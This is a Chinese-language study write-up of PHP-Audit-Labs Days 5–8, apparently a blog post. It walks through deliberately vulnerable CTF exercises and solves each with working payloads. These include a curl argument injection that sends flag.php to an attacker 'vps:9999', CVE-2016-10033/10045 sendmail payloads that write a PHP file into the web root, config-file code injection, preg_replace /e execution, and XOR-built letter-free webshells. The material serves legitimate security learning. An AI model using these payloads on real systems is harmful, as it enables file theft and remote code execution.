+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&#x3D;&#x3D;&quot;0a....sds&quot;</span><br><span class="line">12&#x3D;&#x3D;&quot;12fw...sd&quot;</span><br><span class="line">789&#x3D;&#x3D;&quot;789asabxz&quot;</span><br></pre></td></tr></table></figure>
+<p>字符串会被直接截取前面的纯数字部分进行判断</p>
+<h2 id="Day5"><a href="#Day5" class="headerlink" title="Day5"></a>Day5</h2><h3 id="escapeshellcmd-escapeshellarg"><a href="#escapeshellcmd-escapeshellarg" class="headerlink" title="escapeshellcmd()+escapeshellarg()"></a>escapeshellcmd()+escapeshellarg()</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/6.PNG" alt></p>
+<p>主体上就是一个过滤了后的mail函数执行。<br>mail函数的参数是这样的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bool mail (</span><br><span class="line">	string $to ,</span><br><span class="line">	string $subject ,</span><br><span class="line">	string $message [,</span><br><span class="line">	string $additional_headers [,</span><br><span class="line">	string $additional_parameters ]]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>由于默认调用的是linux的sendmail函数，所以可以在<code>message</code>中写入恶意代码。接着由additional_parameters 指定额外参数，从而写入在指定目录写入文件。</p>
+<p>但是，php的mail函数也在底层默认执行了一层<code>escapeshellcmd()</code>函数，那么显然转义了我们的恶意代码。<br>不过，本题代码还有一处经典的<code>escapeshellarg()</code>。如果<code>escapeshellarg()</code>+<code>escapeshellcmd()</code>搭配使用，将出现特殊字符逃逸的问题。<br>buu上也有一个类似的题目.这里则借用项目里的例子简单介绍下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1<span class="string">' -v -d a=1</span></span><br><span class="line"><span class="string">#escapeshellarg</span></span><br><span class="line"><span class="string">'</span>127.0.0.1<span class="string">'\'</span><span class="string">' -v -d a=1'</span></span><br><span class="line"><span class="comment">#escapeshellcmd</span></span><br><span class="line"><span class="string">'127.0.0.1'</span>\\<span class="string">''</span> -v -d a=1\<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<p>此时最后一步可以看出，<code>\\</code>将被解释为<code>\</code>不再起到转义的作用，而是作为换行符。因此payload变为先是<code>127.0.0.1</code>，再<code>-v -d</code>-d对应的数据为<code>a=1&#39;</code>.</p>
+<p>比如CVE-2016-10033 跟CVE-2016-10045的两个payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com</span><br><span class="line"></span><br><span class="line">a&#39;( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com</span><br></pre></td></tr></table></figure>
+<p>前者没有escapeshellcmd直接打。后者escapeshellcmd后又加了一层escapeshellarg导致字符逃逸。</p>
+<h3 id="练习-4"><a href="#练习-4" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>,$key))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">'are you a hacker'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_POST'</span>, <span class="string">'_GET'</span>, <span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $__R) &#123;</span><br><span class="line">    <span class="keyword">if</span>($$__R) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>($$__R <span class="keyword">as</span> $__k =&gt; $__v) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($$__k) &amp;&amp; $$__k == $__v) <span class="keyword">unset</span>($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST) &#123; waf($_POST);&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET) &#123; waf($_GET); &#125;</span><br><span class="line"><span class="keyword">if</span>($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $_GET[<span class="string">'hongri'</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'error'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">'flag'</span>] ) == md5($_GET[<span class="string">'hongri'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">        $urlInfo = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">"http"</span> === strtolower($urlInfo[<span class="string">"scheme"</span>]) || <span class="string">"https"</span>===strtolower($urlInfo[<span class="string">"scheme"</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">"scheme error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $url = escapeshellarg($url);</span><br><span class="line">        $url = escapeshellcmd($url);</span><br><span class="line">        system(<span class="string">"curl "</span>.$url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"HRCTF&#123;Are_y0u_maz1ng&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>很明显的变量覆盖，之后要绕过waf。再接下来就是escapeshellsmd/arg的搭配进行命令执行了。<br>首先要解决的是，我们必须绕过preg_match的限制才能传入flag变量。因此要利用好它写好的这个功能。</p>
+<p>首先这里利用了可变变量的特性。假设我们提交</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?flag&#x3D;test </span><br><span class="line">post:_GET[flag]&#x3D;test</span><br></pre></td></tr></table></figure>
+<p>当开始遍历 <code>$_POST</code> 超全局数组的时候， <code>$__k</code> 代表 _GET[flag] ，所以 <code>$$__k</code>就是 <code>$_GET[flag]</code> ，即 test 值，此时 <code>$$__k == $__v</code> 成立，变量 <code>$_GET[flag]</code> 就被 unset 了</p>
+<p>而接下来下面又有一个变量覆盖<br><code>if($_POST) extract($_POST, EXTR_SKIP);</code><br>所以直接得到<code>$_GET[flag]=test</code>绕过第一层</p>
+<p>第二层只需利用0e的MD5弱类型比较<br>最后是curl的命令执行<br><code>http://baidu.com/&#39; -F file=@/var/www/html/flag.php -x  vps:9999</code><br>似乎当curl版本变高后，将不再能执行。<br><code>curl &#39;127.0.0.1&#39;\&#39;&#39;</code></p>
+<h2 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h2><h3 id="正则不当导致路径穿越"><a href="#正则不当导致路径穿越" class="headerlink" title="正则不当导致路径穿越"></a>正则不当导致路径穿越</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/7.png" alt></p>
+<p>任意文件删除漏洞。主要是<code>preg_replace()</code>函数的使用不当。忽略了<code>../../</code>这种路径。可以使用路径穿越进行任意文件删除</p>
+<h3 id="练习-5"><a href="#练习-5" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>  (<span class="string">"POST"</span> == $_SERVER[<span class="string">'REQUEST_METHOD'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Wrong Format'</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">TRUE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        $c = <span class="number">0</span>;</span><br><span class="line">        $ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>);</span><br><span class="line">        <span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password))</span><br><span class="line">            $c += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"42"</span> == $password) <span class="keyword">echo</span> $flag;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">'Wrong password'</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>练习里的正则写的十分罕见。其实使用到的是php的字符类。除了一看就懂的upper这些，其他的字符类的含义是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph 空格以外的可打印字符</span><br><span class="line">punct  打印字符，不包括字母数字</span><br></pre></td></tr></table></figure>
+
+<p>主要函数里，第一个正则表示匹配到可打印字符12个以上;第二个正则表示把连续的符号、数字、大写、小写，作为一段，至少分六段;第三个正则表示输入的字符串至少含有符号、数字、大写、小写中的三种类型。</p>
+<p>最后与数字进行弱类型比较。<br>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">42.00e+00000</span><br></pre></td></tr></table></figure>
+<p>红日的文章里还提到了一个配置不当写shell的问题。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'option'</span>])) <span class="keyword">die</span>();</span><br><span class="line">$str = addslashes($_GET[<span class="string">'option'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./config.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">'|\$option=\'.*\';|'</span>, <span class="string">"\$option='$str';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./config.php'</span>, $file);</span><br></pre></td></tr></table></figure>
+
+<p>这个是不带修饰符模式的正则匹配.<br>第一种方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/index.php?option=a';%0aphpinfo();//</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>
+<p>第一个payload写入内容后只有一个单引号被转义的问题。而第二部分再传入一个a时就会因为<code>.*</code>匹配无数次而把<code>\</code>换掉</p>
+<p>还有两种preg_replace的方法、这里提下第二种，也就是还适用于单行(非贪婪)模式的payload。之前安恒的套娃web2里出现过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;ph.php?option&#x3D;;phpinfo();</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;ph.php?option&#x3D;$0</span><br></pre></td></tr></table></figure>
+<p>其最后的效果是下面这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option&#x3D;&#39;$option&#x3D;&#39;;phpinfo();&#39;;&#39;;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Day7"><a href="#Day7" class="headerlink" title="Day7"></a>Day7</h2><h3 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str()变量覆盖"></a>parse_str()变量覆盖</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/8.png" alt></p>
+<blockquote>
+<p>parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。</p>
+</blockquote>
+<p>所以此处存在的变量问题就是<code>parse_str()</code>处理了我们可控的参数后,是可以起到控制全局变量的效果的。因此可以控制<code>$config</code>变量及其对应的参数。达成变量覆盖。</p>
+<p>解决这类变量覆盖问题的最好方法还是通过检查某一变量是否已经设定过了(<code>isset()</code>)。这样在没有设定过变量的else分支才能安全使用<code>parse_str()</code></p>
+<h3 id="练习-6"><a href="#练习-6" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = “hongri”;</span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@parse_str($id);</span><br><span class="line"><span class="keyword">if</span> ($a[<span class="number">0</span>] != <span class="string">'QNKCDZO'</span> &amp;&amp; md5($a[<span class="number">0</span>]) == md5(<span class="string">'QNKCDZO'</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="uploadsomething.php"&gt;flag is here&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//uploadsomething.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line">$referer = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($referer)!== <span class="keyword">false</span>) &#123;</span><br><span class="line">    $savepath = <span class="string">"uploads/"</span> . sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) . <span class="string">"/"</span>;</span><br><span class="line">    <span class="keyword">if</span> (!is_dir($savepath)) &#123;</span><br><span class="line">        $oldmask = umask(<span class="number">0</span>);</span><br><span class="line">        mkdir($savepath, <span class="number">0777</span>);</span><br><span class="line">        umask($oldmask);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((@$_GET[<span class="string">'filename'</span>]) &amp;&amp; (@$_GET[<span class="string">'content'</span>])) &#123;</span><br><span class="line">        <span class="comment">//$fp = fopen("$savepath".$_GET['filename'], 'w');</span></span><br><span class="line">        $content = <span class="string">'HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r'</span>;</span><br><span class="line">        file_put_contents(<span class="string">"$savepath"</span> . $_GET[<span class="string">'filename'</span>], $content);</span><br><span class="line">        $msg = <span class="string">'Flag is here,come on~ '</span> . $savepath . htmlspecialchars($_GET[<span class="string">'filename'</span>]) . <span class="string">""</span>;</span><br><span class="line">        usleep(<span class="number">100000</span>);</span><br><span class="line">        $content = <span class="string">"Too slow!"</span>;</span><br><span class="line">        file_put_contents(<span class="string">"$savepath"</span> . $_GET[<span class="string">'filename'</span>], $content);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">&lt;form action="" method="get"&gt;</span></span><br><span class="line"><span class="string">&lt;div class="form-group"&gt;</span></span><br><span class="line"><span class="string">&lt;label for="exampleInputEmail1"&gt;Filename&lt;/label&gt;</span></span><br><span class="line"><span class="string">&lt;input type="text" class="form-control" name="filename" id="exampleInputEmail1" placeholder="Filename"&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class="form-group"&gt;</span></span><br><span class="line"><span class="string">&lt;label for="exampleInputPassword1"&gt;Content&lt;/label&gt;</span></span><br><span class="line"><span class="string">&lt;input type="text" class="form-control" name="content" id="exampleInputPassword1" placeholder="Contont"&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;button type="submit" class="btn btn-default"&gt;Submit&lt;/button&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">EOT;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you can not see this page'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>第一部分是一个比较刻意的<code>parse_str()</code>变量覆盖的用例。只要解决md5弱类型比较的问题就好了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;a[0]&#x3D;s878926199a</span><br></pre></td></tr></table></figure>
+
+<p>第二部分先是注意一个referer头要带上。之后就是一个读flag的问题了。因为flag的内容会在挂起0.1s然后被替换掉。所以需要我们去条件竞争。当然这里上传目录是固定的。所以就可以放心发包了。</p>
+<h2 id="Day8"><a href="#Day8" class="headerlink" title="Day8"></a>Day8</h2><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/9.png" alt></p>
+<p>这是一个自己刚了解CTF不久时接触的一个<code>preg_replace()</code>在<code>/e</code>下存在代码执行的漏洞了。当然这个洞是php5.5版本的</p>
+<p>我们的参数可以控制preg_replace的第一，三个参数。达成任意代码执行。</p>
+<p>然后当时也是读到一篇文章专门讲到这里payload的构造<br>原本官方的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?.*&#x3D;&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>如果GET请求的参数名存在非法字符，PHP会将其替换成下划线，即<code>.*</code> 会变成 <code>_*</code><br>而实际可行的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*&#x3D;$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="练习-7"><a href="#练习-7" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE);</span><br><span class="line"><span class="comment">// $hint = "php function getFlag() to get flag";</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">50</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Too Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not Allowed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE);</span><br><span class="line"><span class="comment">// $hint = "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>已经司空见惯的无数字字母webshell书写了</p>
+<p>留一个FUZZ脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = str_split(<span class="string">'getFlag'</span>);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++)&#123;</span><br><span class="line">    $ch = <span class="string">'&#123;'</span>^ chr($i);</span><br><span class="line">    <span class="keyword">if</span> (in_array($ch, $a , <span class="keyword">true</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&#123; ^ chr("</span>.$i.<span class="string">") = $ch&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&#123;&#123;&#123;&#123;&#123;&#123;&#123;"</span>^chr(<span class="number">28</span>).chr(<span class="number">30</span>).chr(<span class="number">15</span>).chr(<span class="number">61</span>).chr(<span class="number">23</span>).chr(<span class="number">26</span>).chr(<span class="number">28</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$_();</span><br></pre></td></tr></table></figure>
+<p>payload2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$哼&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1c%1e%0f%3d%17%1a%1c&quot;;$哼();</span><br></pre></td></tr></table></figure>
+<p>上次做36d的某道题自己用了最极限的无数字字母且不能异或取反的webshell。也就是通配符加上php临时文件命令执行。那个应该算是比较难用的，但可以解决大部分waf了</p>
